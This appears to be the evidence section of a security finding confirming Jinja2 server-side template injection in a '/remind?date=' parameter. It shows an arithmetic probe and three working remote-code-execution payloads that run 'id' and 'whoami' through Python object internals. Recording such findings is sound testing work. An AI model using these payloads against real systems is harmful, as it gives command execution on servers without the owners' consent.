evidence:
Manual testing confirms the vulnerability:

Test 1 - Mathematical Expression Evaluation:
• Payload: {{7*7}} (URL encoded as %7B%7B7*7%7D%7D)
• Request: GET /remind?date={{7*7}}
• Response: "Reminder will be sent on 49"
• Result: Template expression was evaluated (7 × 7 = 49), confirming arbitrary code evaluation

Test 2 - Filter Expression Processing:
• Jinja2 filters are processed, allowing access to object attributes and methods
• Examples: {{string|length}}, {{object|attr('__class__')}}

Test 3 - Remote Code Execution Payload Examples:
The vulnerability can be escalated to full RCE using Jinja2 payloads such as:
• {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
• {{\"\".__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
• {{self.__init__.__globals__.__builtins__['__import__']('os').popen('whoami').read()}}

